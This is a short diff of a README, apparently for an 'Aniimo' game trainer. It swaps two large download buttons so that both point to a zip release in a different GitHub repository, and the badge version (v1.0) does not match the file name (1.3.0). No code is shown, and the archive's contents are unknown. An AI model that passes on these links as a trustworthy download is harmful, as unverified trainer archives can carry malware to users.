@@ -7,7 +7,7 @@
 
 <br/>
 
-<a href="-">
+<a href="https://github.com/CyanKaiserHaul/aniimo-mod-trainer/releases/download/Latest/Aniimo_Trainer_1.3.0.zip">
   <img src="https://img.shields.io/badge/⬇%20%20GET%20ANIIMO%20TRAINER%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
@@ -149,7 +149,7 @@ Game:              Aniimo — current Steam release
 
 <div align="center">
 
-<a href="https://github.com/CoveBlackbirdFold/aniimo-modkit/releases/download/v1.0.0/Aniimo_Trainer_v1.0.zip">
+<a href="https://github.com/CyanKaiserHaul/aniimo-mod-trainer/releases/download/Latest/Aniimo_Trainer_1.3.0.zip">
   <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20ANIIMO%20TRAINER%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
